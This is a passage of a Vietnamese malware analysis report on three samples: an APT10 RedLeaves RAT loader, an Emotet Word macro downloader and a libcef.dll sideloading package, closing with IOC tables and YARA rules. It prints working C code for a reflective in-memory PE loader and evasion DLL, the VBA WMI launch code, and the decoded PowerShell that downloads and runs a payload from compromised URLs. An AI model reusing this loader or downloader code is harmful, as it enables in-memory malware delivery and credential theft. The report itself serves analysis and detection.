/**
 * ==============================================================================
 * MÃ NGUỒN CỐT LÕI CỦA SHELLCODE LOADER TRONG TỆP DAT
 * Khôi phục PE header bị làm mờ và nạp RedLeaves RAT trực tiếp trong bộ nhớ RAM
 * ==============================================================================
 */
void ReflectivePELoader(BYTE* pRawPayloadWithShellcode) {
    // 1. Phân giải các API động từ KERNEL32
    HMODULE hKernel32 = GetKernel32Base();
    pfnLoadLibraryA   fnLoadLibraryA   = (pfnLoadLibraryA)CustomGetProcAddress(hKernel32, "LoadLibraryA");
    pfnGetProcAddress fnGetProcAddress = (pfnGetProcAddress)CustomGetProcAddress(hKernel32, "GetProcAddress");
    pfnVirtualAlloc   fnVirtualAlloc   = (pfnVirtualAlloc)CustomGetProcAddress(hKernel32, "VirtualAlloc");
    pfnVirtualProtect fnVirtualProtect = (pfnVirtualProtect)CustomGetProcAddress(hKernel32, "VirtualProtect");

    // 2. Vị trí của tệp PE nhị phân nằm ngay sau Shellcode Loader (Offset ~ 0x1468)
    BYTE* pEmbeddedPE = pRawPayloadWithShellcode + 0x1468;

    // 3. Khôi phục Header bị tác giả APT10 làm mờ:
    //    Hai byte đầu bị đổi từ 'MZ' (0x5A4D) thành 0xFF 0xFF
    //    Signature PE bị đổi từ 'PE\0\0' (0x00004550) thành 0xFF 0xFF 0x00 0x00
    if (pEmbeddedPE[0] == 0xFF && pEmbeddedPE[1] == 0xFF) {
        pEmbeddedPE[0] = 'M';
        pEmbeddedPE[1] = 'Z';
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pEmbeddedPE;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pEmbeddedPE + pDos->e_lfanew);

    if (*(WORD*)&pNt->Signature == 0xFFFF) {
        pNt->Signature = IMAGE_NT_SIGNATURE; // Khôi phục 'PE\0\0'
    }

    // 4. Cấp phát vùng nhớ ảo hoàn chỉnh theo SizeOfImage
    BYTE* pImageBase = (BYTE*)fnVirtualAlloc(
        (LPVOID)pNt->OptionalHeader.ImageBase,
        pNt->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

    // Nếu địa chỉ ưu tiên (Preferred ImageBase) bị chiếm dụng, cấp phát địa chỉ bất kỳ
    if (!pImageBase) {
        pImageBase = (BYTE*)fnVirtualAlloc(
            NULL,
            pNt->OptionalHeader.SizeOfImage,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
    }

    // 5. Sao chép Headers vào bộ nhớ mới
    memcpy(pImageBase, pEmbeddedPE, pNt->OptionalHeader.SizeOfHeaders);

    // 6. Sao chép từng Section (.text, .rdata, .data, .reloc) vào đúng VirtualAddress
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData > 0) {
            memcpy(
                pImageBase + pSec[i].VirtualAddress,
                pEmbeddedPE + pSec[i].PointerToRawData,
                pSec[i].SizeOfRawData
            );
        }
    }

    // 7. Xử lý Base Relocation nếu ImageBase thực tế khác Preferred ImageBase
    ptrdiff_t delta = (ptrdiff_t)(pImageBase - pNt->OptionalHeader.ImageBase);
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pImageBase + relocDir.VirtualAddress);
            while (pReloc->VirtualAddress > 0) {
                DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* pList = (WORD*)(pReloc + 1);
                for (DWORD j = 0; j < count; j++) {
                    if ((pList[j] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD* pPatchAddr = (DWORD*)(pImageBase + pReloc->VirtualAddress + (pList[j] & 0x0FFF));
                        *pPatchAddr += (DWORD)delta;
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    // 8. Nạp bảng IAT (Import Address Table) cho các DLL phụ thuộc
    IMAGE_DATA_DIRECTORY importDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pImageBase + importDir.VirtualAddress);
        while (pImport->Name != 0) {
            char* szDllName = (char*)(pImageBase + pImport->Name);
            HMODULE hDll = fnLoadLibraryA(szDllName);

            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pImageBase + pImport->FirstThunk);
            PIMAGE_THUNK_DATA pOrigThunk = (pImport->OriginalFirstThunk) ? 
                (PIMAGE_THUNK_DATA)(pImageBase + pImport->OriginalFirstThunk) : pThunk;

            while (pOrigThunk->u1.AddressOfData != 0) {
                if (IMAGE_SNAP_BY_ORDINAL(pOrigThunk->u1.Ordinal)) {
                    pThunk->u1.Function = (DWORD_PTR)fnGetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(pOrigThunk->u1.Ordinal));
                } else {
                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(pImageBase + pOrigThunk->u1.AddressOfData);
                    pThunk->u1.Function = (DWORD_PTR)fnGetProcAddress(hDll, (LPCSTR)pImportByName->Name);
                }
                pThunk++;
                pOrigThunk++;
            }
            pImport++;
        }
    }

    // 9. Nhảy vào EntryPoint của RedLeaves RAT (DLL/EXE Entry)
    typedef BOOL(WINAPI *pfnDllMain)(HINSTANCE, DWORD, LPVOID);
    pfnDllMain EntryPoint = (pfnDllMain)(pImageBase + pNt->OptionalHeader.AddressOfEntryPoint);
    
    // Kích hoạt RAT hoàn chỉnh trong RAM
    EntryPoint((HINSTANCE)pImageBase, DLL_PROCESS_ATTACH, NULL);
}
```

Đây là file dll để làm lớp vỏ bọc tránh bị phát hiện
```
#include <windows.h>
#include <winternl.h>

typedef HMODULE (WINAPI *pfnLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC (WINAPI *pfnGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef LPVOID  (WINAPI *pfnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

// Tự tìm Base của kernel32.dll qua PEB (Position Independent Code)
HMODULE GetKernel32Base() {
    PPEB pPeb = NULL;
    __asm {
        mov eax, fs:[0x30]
        mov pPeb, eax
    }
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pCurr = pHead->Flink;

    while (pCurr != pHead) {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pCurr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (pEntry->FullDllName.Buffer && (pEntry->FullDllName.Buffer[0] == L'K' || pEntry->FullDllName.Buffer[0] == L'k')) {
            return (HMODULE)pEntry->DllBase;
        }
        pCurr = pCurr->Flink;
    }
    return NULL;
}

// Shellcode Reflective Loader cốt lõi
void ReflectivePELoader(BYTE* pRawPayloadWithShellcode) {
    HMODULE hKernel32 = GetKernel32Base();
    // Tự phân giải API không thông qua IAT
    pfnLoadLibraryA   fnLoadLibraryA   = (pfnLoadLibraryA)CustomGetProcAddress(hKernel32, "LoadLibraryA");
    pfnGetProcAddress fnGetProcAddress = (pfnGetProcAddress)CustomGetProcAddress(hKernel32, "GetProcAddress");
    pfnVirtualAlloc   fnVirtualAlloc   = (pfnVirtualAlloc)CustomGetProcAddress(hKernel32, "VirtualAlloc");

    // 1. Định vị tệp PE nằm ngay sau Shellcode Loader (offset ~ 0x1468)
    BYTE* pEmbeddedPE = pRawPayloadWithShellcode + 0x1468;

    // 2. Khôi phục Header bị tác giả APT10 làm mờ: 0xFF 0xFF -> MZ (0x5A4D)
    if (pEmbeddedPE[0] == 0xFF && pEmbeddedPE[1] == 0xFF) {
        pEmbeddedPE[0] = 'M';
        pEmbeddedPE[1] = 'Z';
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pEmbeddedPE;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pEmbeddedPE + pDos->e_lfanew);
    if (*(WORD*)&pNt->Signature == 0xFFFF) {
        pNt->Signature = IMAGE_NT_SIGNATURE; // Khôi phục 'PE\0\0'
    }

    // 3. Cấp phát vùng nhớ ảo hoàn chỉnh theo SizeOfImage của RAT
    BYTE* pImageBase = (BYTE*)fnVirtualAlloc(
        (LPVOID)pNt->OptionalHeader.ImageBase,
        pNt->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
    if (!pImageBase) {
        pImageBase = (BYTE*)fnVirtualAlloc(NULL, pNt->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    }

    // 4. Sao chép Headers và từng Section (.text, .rdata, .data, .reloc)
    memcpy(pImageBase, pEmbeddedPE, pNt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData > 0) {
            memcpy(pImageBase + pSec[i].VirtualAddress, pEmbeddedPE + pSec[i].PointerToRawData, pSec[i].SizeOfRawData);
        }
    }

    // 5. Xử lý Base Relocations (nếu nạp khác địa chỉ ImageBase mong muốn)
    ptrdiff_t delta = (ptrdiff_t)(pImageBase - pNt->OptionalHeader.ImageBase);
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pImageBase + relocDir.VirtualAddress);
            while (pReloc->VirtualAddress > 0) {
                DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* pList = (WORD*)(pReloc + 1);
                for (DWORD j = 0; j < count; j++) {
                    if ((pList[j] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD* pPatchAddr = (DWORD*)(pImageBase + pReloc->VirtualAddress + (pList[j] & 0x0FFF));
                        *pPatchAddr += (DWORD)delta;
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    // 6. Phân giải bảng Import Address Table (IAT)
    IMAGE_DATA_DIRECTORY importDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pImageBase + importDir.VirtualAddress);
        while (pImport->Name != 0) {
            char* szDllName = (char*)(pImageBase + pImport->Name);
            HMODULE hDll = fnLoadLibraryA(szDllName);
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pImageBase + pImport->FirstThunk);
            PIMAGE_THUNK_DATA pOrigThunk = (pImport->OriginalFirstThunk) ? 
                (PIMAGE_THUNK_DATA)(pImageBase + pImport->OriginalFirstThunk) : pThunk;

            while (pOrigThunk->u1.AddressOfData != 0) {
                if (IMAGE_SNAP_BY_ORDINAL(pOrigThunk->u1.Ordinal)) {
                    pThunk->u1.Function = (DWORD_PTR)fnGetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(pOrigThunk->u1.Ordinal));
                } else {
                    PIMAGE_IMPORT_BY_NAME pIBN = (PIMAGE_IMPORT_BY_NAME)(pImageBase + pOrigThunk->u1.AddressOfData);
                    pThunk->u1.Function = (DWORD_PTR)fnGetProcAddress(hDll, (LPCSTR)pIBN->Name);
                }
                pThunk++;
                pOrigThunk++;
            }
            pImport++;
        }
    }

    // 7. Nhảy vào EntryPoint kích hoạt toàn bộ tính năng RAT của RedLeaves
    typedef BOOL(WINAPI *pfnDllMain)(HINSTANCE, DWORD, LPVOID);
    pfnDllMain EntryPoint = (pfnDllMain)(pImageBase + pNt->OptionalHeader.AddressOfEntryPoint);
    EntryPoint((HINSTANCE)pImageBase, DLL_PROCESS_ATTACH, NULL);
}
```
Từ 2 chứng cứ trên ta có thể xác định được luồng hoạt động hoàn chỉnh của con malware này
[obedience.exe (Host sạch)]
       │ (Tự nạp theo Search Order)
       ▼
[StarBurn.dll (Proxy Sideload)]
       │ 1. Đọc file "handkerchief.dat"
       │ 2. Giải mã XOR chia đôi mảng bằng 16-byte Key
       │ 3. VirtualAlloc(PAGE_EXECUTE_READWRITE)
       ▼
[handkerchief.dat (Shellcode Stage 2)]
       │ 1. Tìm Kernel32 qua PEB
       │ 2. Sửa header 0xFF 0xFF -> 'MZ' và 'PE'
       │ 3. Map PE Sections + Fix Relocations + Resolve IAT
       ▼
[RedLeaves RAT chạy hoàn toàn trên RAM] (Chụp màn hình, trộm pass Firefox/DPAPI, kết nối C2)

IOC và YARA RULE sẽ được đặt ở cuối
MALware số 2 : 2.doc (Emotet Downloader)

### 1. Phân tích tĩnh Macro OLE (Static Analysis)
Mẫu ban đầu là tài liệu Word `2.doc` thuộc định dạng OLE2 Compound File. Khi kiểm tra bằng `olevba`, tài liệu chứa macro VBA độc hại được kích hoạt tự động qua sự kiện:
```vb
Private Sub Document_open()
    Ot3jeffcid_.Tcd6nx18b11zqeo7l9
End Sub
```

Macro sử dụng các kỹ thuật làm mờ (obfuscation):
- **Chèn code rác toán học (Dead code):** Rải các biểu thức tính toán vô nghĩa (`klEP6Sq = ...`, `duFdpjP83 = ...`) và bẫy lỗi `On Error Resume Next` để gây rối mắt phân tích viên.
- **Kỹ thuật phân tách chuỗi rác (Delimiter Junk Splitting):** Dùng chuỗi rác đặc trưng `(hsv 32(()hq gq721g()))) hsu0())`. Hàm `W_2kt58knmgixx05m` cắt bỏ chuỗi rác này bằng `Split` rồi `Join` lại để khôi phục xâu thực thi:
  ```vb
  Function W_2kt58knmgixx05m(Z59y9dd2upyqv4nmo)
      Mofsgct8un8w0l = Split(Z59y9dd2upyqv4nmo, "(hsv 32(()hq gq721g()))) hsu0())")
      W_2kt58knmgixx05m = Join(Mofsgct8un8w0l, "")
  End Function
  ```
  Sau khi khử rác, chuỗi ghép lại là: `winmgmts:win32_process` và đối tượng `win32_processstartup` với thuộc tính `showwindow = 0` (ẩn toàn bộ giao diện dòng lệnh).
- **Giấu payload trong thuộc tính Form ControlTipText:** Để né các bộ quét chữ ký tĩnh dò tìm chuỗi `powershell`, mã độc lưu toàn bộ câu lệnh thực thi trong tooltip của tab form (`Tabs(1).ControlTipText`).
- **Thực thi ngầm qua WMI (MITRE ATT&CK: T1047):**
  ```vb
  CreateObject("winmgmts:Win32_Process").Create(Min6swuqek9ob, NULL, ProcessStartupConfig)
  ```
  Việc sử dụng WMI giúp cắt đứt quan hệ tiến trình cha - con trực tiếp giữa `WINWORD.EXE` và `powershell.exe`, nhằm né tránh luật phát hiện của các giải pháp EDR.

---

### 2. Phân tích động bằng Process Monitor (Procmon) & Bằng chứng thực nghiệm

Khi theo dõi hoạt động hệ thống bằng Process Monitor với bộ lọc:
- `Process Name is powershell.exe`
- `Process Name is wmiprvse.exe`
- `Process Name is WINWORD.EXE`

Ta thu được các mắt xích thực thi theo đúng trình tự thời gian:

#### a. Bắt quan hệ tiến trình WMI và câu lệnh ẩn
Trong sự kiện `Process Create`, `wmiprvse.exe` (PID 3708 - WMI Provider Host) đứng ra sinh tiến trình `powershell.exe` (PID 7480) đi kèm tiến trình hỗ trợ console `conhost.exe 0xffffffff -ForceV1`.
Trong tab **Process / Event Properties** của sự kiện, mục **Command line** ghi nhận nguyên văn câu lệnh:
```cmd
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -e JABBAHUAagAwAHAAYgBtAD0AKAAnAE8AJwArACgAJwA2AGwAOQAnACsAJwAyAGYAYwAnACkAKQA...
```

#### b. Bắt dấu vết kết nối mạng (Network C2 Trace)
Trong sự kiện `TCP Connect`, `powershell.exe` kết nối ra ngoài Internet tới máy chủ lưu trữ payload:
- **Path:** `DESKTOP-EEUOBIV:50120 -> 144.99.107.86.netsons.net:http`
- **Result:** `SUCCESS`
- **Máy chủ đích:** IP `144.99.107.86` cổng `80` (Hạ tầng lưu trữ Web Hosting của Netsons s.r.l tại Ý), phân giải từ tên miền `dolphininsight.it`.

---

### 3. Giải mã kịch bản PowerShell (Stage 2 Payload)

Chuỗi Base64 sau cờ `-e` được giải mã theo định dạng UTF-16LE:
```powershell
$b64 = "JABBAHUAagAwAHAAYgBtAD0AKAAnAE8AJwArACgAJwA2AGwAOQAnACsAJwAyAGYAYwAnACkAKQA..."
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64))
```

Nội dung kịch bản PowerShell gốc sau khi giải mã:
```powershell
# 1. Tạo thư mục tạm ngụy trang tên WORD\2019
&('new-item') $env:Temp\WORD\2019\ -itemtype Directory;

# 2. Bật giao thức mạng TLS 1.2, TLS 1.1, TLS 1.0 để tương thích kết nối HTTPS
[Net.ServicePointManager]::SecurityProtocol = ('tls12, tls11, tls');

# 3. Định nghĩa đường dẫn file thực thi đích
$Hlttecc = $env:temp + '\WORD\2019\O1jp0j.exe';
$Wket1s4 = &('new-object') Net.WebClient;

# 4. Danh sách 7 máy chủ C2 / website WordPress bị xâm nhập (ngăn cách bởi dấu '*')
$Smyttl7 = (
    'https://dadieroque.com/wp-admin/dg/*' +
    'https://sulselekspres.com/cgi-bin/6l0nyO/*' +
    'https://maulanarumifoundation.com/RumiFoundation/Q9etF/*' +
    'https://kelas.yec.co.id/srjns/B/*' +
    'http://caesarmoving.com/wp-content/9s/*' +
    'https://kinepremins.cl/wp-admin/6wr/*' +
    'http://dolphininsight.it/wp-includes/LVf/'
).Split([char]42);

# 5. Vòng lặp tải xoay vòng và kiểm tra ngưỡng kích thước hợp lệ
foreach ($Cgctt61 in $Smyttl7) {
    try {
        $Wket1s4.DownloadFile($Cgctt61, $Hlttecc);
        # Điều kiện kiểm tra kích thước tối thiểu >= 39,850 bytes (đảm bảo file exe thực sự, tránh trang lỗi 404 HTML)
        if ((&( 'Get-Item' ) $Hlttecc).length -ge 39850) {
            .('Invoke-Item')($Hlttecc); # Thực thi payload Emotet
            break;
        }
    } catch {}
}
```

---

### 4. Sơ đồ luồng hoạt động Mẫu 2

```
[2.doc (Tài liệu Word)]
       │
       ▼ (Người dùng mở file & Enable Content)
[Document_Open() trong VBA Macro]
       │ 1. Khử rác "(hsv 32(()hq gq721g()))) hsu0())"
       │ 2. Lấy Base64 command trong ControlTipText
       │ 3. Gọi Win32_Process.Create() với ShowWindow = 0
       ▼
[wmiprvse.exe (WMI Provider Host - PID 3708)]
       │ (Sinh tiến trình con ngầm)
       ▼
[powershell.exe -e <Base64> (PID 7480)]
       │ 1. Tạo thư mục %TEMP%\WORD\2019\
       │ 2. Kết nối tới 144.99.107.86 (dolphininsight.it) qua HTTP port 80
       │ 3. Tải file nhị phân kiểm tra kích thước >= 39,850 bytes
       ▼
[Kích hoạt mã độc thứ cấp: %TEMP%\WORD\2019\O1jp0j.exe]
```

---

MALware số 3 : wss.exe + libcef.dll + config.ini (DLL Sideloading 64-bit)

### 1. Phân tích cấu trúc bộ 3 thành phần
Gói tấn công đại diện cho kỹ thuật APT DLL Sideloading (DLL Search Order Hijacking) trên nền tảng 64-bit:
- **`wss.exe` (737,472 bytes - Clean Host):** Tệp thực thi hợp pháp nguyên bản từ bên thứ ba, phụ thuộc vào Chromium Embedded Framework (CEF) và khai báo nhập 35 hàm API từ thư viện `libcef.dll`.
- **`libcef.dll` (243,712 bytes - Sideloading Proxy DLL):** Thư viện liên kết động độc hại (Trojan:Win32/Posilod), giả mạo DLL chính thống của CEF, xuất khẩu chính xác 35 hàm stub để khớp với IAT của `wss.exe`. Mã lệnh bên trong được làm mờ bằng OLLVM (Mixed Boolean Arithmetic & Control Flow Flattening).
- **`config.ini` (307,200 bytes - Encrypted Payload):** Payload nhị phân đã bị mã hóa/obfuscate với kích thước cố định đúng 300 KB. 16 byte đầu tiên đóng vai trò Key Header (`05 44 34 66 9B 6F 64 8F E3 B7 17 9D AD CE 92 A7`).

---

### 2. Phân tích động bằng Process Monitor (Procmon)

Khi giám sát tiến trình `wss.exe` trên Process Monitor (bộ lọc: `Process Name is wss.exe`), ta ghi nhận được toàn bộ chuỗi nạp DLL và payload:

1. **Nạp DLL Sideloading:**
   - `wss.exe` kích hoạt, tìm kiếm thư viện `libcef.dll` trong cùng thư mục hiện tại theo cơ chế DLL Search Order và nạp thành công (`CreateFile` / `Load Image` $\rightarrow$ `SUCCESS`).
2. **Đọc và nạp Payload mã hóa vào RAM:**
   - `libcef.dll` gọi API duyệt thư mục (`FindFirstFileExW` / `FindNextFileW`) định vị tệp `config.ini`.
   - Thực hiện `CreateFile` và `ReadFile` toàn bộ 307,200 bytes của `config.ini` lên bộ nhớ tiến trình `wss.exe`.
3. **Nạp các module hỗ trợ mạng & mật mã hệ thống:**
   - Sau khi giải mã payload trong RAM, tiến trình nạp các thư viện:
     - `WININET.dll`: Thư viện giao thức mạng HTTP/HTTPS kết nối C2.
     - `cryptsp.dll`, `cryptbase.dll`, `rsaenh.dll`: Microsoft Enhanced Cryptographic Provider xử lý mã hóa dòng và bắt tay khóa bảo mật.
     - `mswsock.dll`, `SspiCli.dll`: Giao tiếp socket tầng thấp và xử lý xác thực vượt proxy mạng doanh nghiệp.

---

### 3. Sơ đồ luồng hoạt động Mẫu 3

```
[wss.exe (Clean CEF Host)]
       │ (Tự nạp theo DLL Search Order)
       ▼
[libcef.dll (Proxy Sideload 64-bit)]
       │ 1. Khai báo 35 export stubs để tránh crash ứng dụng
       │ 2. Tìm và nạp config.ini (300 KB) vào bộ đệm RAM
       │ 3. Giải mã Shellcode và đổi thuộc tính trang nhớ sang PAGE_EXECUTE_READWRITE
       ▼
[Vùng nhớ RWX trong tiến trình wss.exe]
       │ 1. Nạp WinINet.dll + rsaenh.dll + mswsock.dll
       │ 2. Thiết lập kết nối mã hóa C2 âm thầm từ trong tiến trình hợp pháp
       ▼
[RAT Payload chạy hoàn toàn In-Memory né quét EDR]
```

---

# III. Bảng Tổng Hợp Chỉ Số Nhận Diện (IOCs) & YARA Rules

## 1. Bảng tổng hợp IOCs cả 3 mẫu

| Mẫu | Tên file | Kích thước | SHA-256 | Dấu vết Host / Persistence | Network IOC / C2 |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Mẫu 1** | `123.exe` | 3,804,161 B | `66421690816c94bc0bef48b81520729df355d35adba6933cee93fc5b2f7a639b` | Mutex `cplusplus_me`, xả `%TEMP%\obedience.exe`, `StarBurn.dll`, `handkerchief.dat`, shortcut `persuasion.lnk` | HTTP POST `/index.php` (`clientid`, `__data`, `__serial`), Raw TCP socket |
| **Mẫu 1 con** | `StarBurn.dll` | 134,144 B | `63d5aa72d8e0b55f59a1e28e53d2cc6f7f94ec978ec4690862fdadbde00a7ac0` | Sideloaded DLL proxy stubs | Nạp payload nội bộ |
| **Mẫu 1 con** | `handkerchief.dat` | 254,593 B | `773b176b3a68c3d21fae907af8fba7908b55726bd591c5335c8c0bc9de179b76` | Payload mã hóa XOR chia đôi mảng | Chứa RedLeaves RAT PE |
| **Mẫu 1 con** | `RedLeaves_RAT.exe`| 249,352 B | `b9d616b6db7cf7832fd68cb47a9b9753e55c1d8013b184f2c57b4f5fc6c12eea` | Trộm password Firefox SQLite, DPAPI `CryptUnprotectData`, chụp màn hình GDI | Socket `serverip`, `serverport`, `ReverseIpAddr`, `PortMappingSlave` |
| **Mẫu 2** | `2.doc` | 220,553 B | `d5ce788fe908e1df5ca826179a3d5df41b1f1e441daf98c672e9b69a6fc3c7b8` | Thư mục `%TEMP%\WORD\2019\`, gọi WMI `Win32_Process`, file tải `%TEMP%\WORD\2019\O1jp0j.exe` | IP `144.99.107.86:80`, 7 website: `dolphininsight.it`, `dadieroque.com`, `sulselekspres.com`, `maulanarumifoundation.com`, `kelas.yec.co.id`, `caesarmoving.com`, `kinepremins.cl` |
| **Mẫu 3** | `wss.exe` | 737,472 B | `97ed6221334e20650504e0ba8964687b66fcf89172a633ebcd6c1da09663405f` | Clean CEF Host | Sideloading target |
| **Mẫu 3 con** | `libcef.dll` | 243,712 B | `d9bb10d2e612cf27c9f5bdfa39e0b62ac89f1dff89cb6a5f04a46d142b376fa7` | 35 CEF export stubs, OLLVM MBA obfuscation | Gọi `WININET.dll` kết nối C2 |
| **Mẫu 3 con** | `config.ini` | 307,200 B | `c9bcdf3b0c1ee5c3585b14995800559ded06e842918ed7155a58d9138db7c1e0` | Payload nhị phân mã hóa 300 KB | Chứa Shellcode RAT trong RAM |

---

## 2. Bộ luật YARA (YARA Ruleset)

```yara
/*
    YARA Ruleset for Malware Analysis Report - Samples 1, 2, 3
    Targets: APT10 RedLeaves, Emotet Downloader, Posilod Sideloading
*/

rule APT10_RedLeaves_Dropper {
    meta:
        description = "Detects APT10 RedLeaves Dropper (123.exe)"
        threat_actor = "APT10 (Stone Panda / MenuPass)"
        malware_family = "RedLeaves"
        hash_sha256 = "66421690816c94bc0bef48b81520729df355d35adba6933cee93fc5b2f7a639b"
    strings:
        $mutex = "cplusplus_me" ascii
        $f1 = "obedience.exe" ascii
        $f2 = "StarBurn.dll" ascii
        $f3 = "handkerchief.dat" ascii
        $xor_loop = { 8A 08 32 CA 88 08 40 3B C6 }
    condition:
        uint16(0) == 0x5A4D and (
            ($mutex and 2 of ($f*)) or
            ($xor_loop and 2 of ($f*))
        )
}

rule APT10_RedLeaves_SideLoad_DLL {
    meta:
        description = "Detects malicious StarBurn.dll proxy stub used for DLL Sideloading"
        threat_actor = "APT10 (Stone Panda / MenuPass)"
        malware_family = "RedLeaves"
        hash_sha256 = "63d5aa72d8e0b55f59a1e28e53d2cc6f7f94ec978ec4690862fdadbde00a7ac0"
    strings:
        $payload_name = "handkerchief.dat" ascii
        $lnk_persist  = "persuasion.lnk" ascii
        $export1 = "StarBurn_Create" ascii
        $export2 = "StarBurn_Destroy" ascii
    condition:
        uint16(0) == 0x5A4D and (
            ($payload_name and $lnk_persist) or
            ($payload_name and all of ($export*))
        )
}

rule APT10_RedLeaves_RAT_Payload {
    meta:
        description = "Detects RedLeaves RAT payload in memory or decrypted artifact"
        threat_actor = "APT10 (Stone Panda / MenuPass)"
        malware_family = "RedLeaves"
        hash_sha256 = "b9d616b6db7cf7832fd68cb47a9b9753e55c1d8013b184f2c57b4f5fc6c12eea"
    strings:
        $http_uri = "index.php" wide
        $param1 = "__data=" wide
        $param2 = "__serial=" wide
        $param3 = "__upt=" wide
        $param4 = "__msgid=" wide
        $param5 = "clientid=" wide
        $cfg1 = "serverip" ascii
        $cfg2 = "serverport" ascii
        $cfg3 = "ReverseIpAddr" ascii
        $rtti1 = ".?AVPortMappingSlave@@" ascii
        $ff_sql = "select hostname, encryptedUsername, encryptedPassword from moz_logins" ascii
        $ff_nss = "PK11_CheckUserPassword" ascii
    condition:
        3 of ($param*) or
        (2 of ($cfg*) and $rtti1) or
        $ff_sql or
        ($ff_nss and $http_uri)
}

rule Emotet_Word_Macro_Downloader_2Doc {
    meta:
        description = "Detects Emotet VBA Downloader using WMI Win32_Process and ControlTipText Obfuscation"
        threat_actor = "Emotet / TA542"
        hash_sha256 = "d5ce788fe908e1df5ca826179a3d5df41b1f1e441daf98c672e9b69a6fc3c7b8"
    strings:
        $junk_str = "(hsv 32(()hq gq721g()))) hsu0())" ascii wide
        $form1 = "Ot3jeffcid_" ascii wide
        $form2 = "Om44_htfve2dp" ascii wide
        $wmi = "win32_process" ascii nocase
        $path_marker = "WORD\\2019" ascii wide
    condition:
        uint16(0) == 0xCFD0 and (
            $junk_str or
            (all of ($form*) and $wmi) or
            ($path_marker and $wmi)
        )
}

rule Posilod_Libcef_DLL_Sideloading {
    meta:
        description = "Detects malicious libcef.dll proxy stub used in 64-bit DLL Sideloading"
        threat_actor = "Unknown / Posilod"
        hash_sha256 = "d9bb10d2e612cf27c9f5bdfa39e0b62ac89f1dff89cb6a5f04a46d142b376fa7"
    strings:
        $exp1 = "cef_string_utf8_to_utf16" ascii
        $exp2 = "cef_string_utf16_cmp" ascii
        $exp3 = "cef_execute_process" ascii
        $exp4 = "cef_api_hash" ascii
        $exp5 = "cef_string_multimap_alloc" ascii
    condition:
        uint16(0) == 0x5A4D and
        uint32(uint32(0x3C)) == 0x00004550 and
        all of ($exp*)
}
```




 
